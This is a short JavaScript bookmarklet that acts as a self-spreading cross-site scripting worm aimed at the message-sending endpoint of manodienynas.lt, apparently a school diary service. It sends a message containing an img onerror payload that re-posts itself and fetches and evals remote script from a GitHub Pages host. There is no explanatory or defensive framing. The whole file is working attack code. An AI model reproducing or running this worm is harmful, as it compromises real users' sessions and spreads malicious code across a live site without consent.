javascript: var s = 'javascript:var s = \'QWERTY\';s = s.replace(\'QWE\' + \'RTY\', s.replaceAll(String.fromCharCode(39), String.fromCharCode(92, 39))).replace(/./g, function(x) {return \'&#\' + x.charCodeAt(0)});var xhr = new XMLHttpRequest();xhr.open(\'GET\', \'https://kristalas.github.io/test.js\', true);xhr.onreadystatechange=()=>{if(xhr.readyState==4)eval(xhr.response)};xhr.send();';
s = s.replace('QWE' + 'RTY', s.replaceAll(String.fromCharCode(39), String.fromCharCode(92, 39))).replace(/./g, function(x) {
    return '&#' + x.charCodeAt(0)
});
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://www.manodienynas.lt/1/lt/action/message_new/send', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
xhr.send('glids=&message_label=..&message_body=' + encodeURIComponent('<img src=x onerror="' + s + '">'));
alert(1);
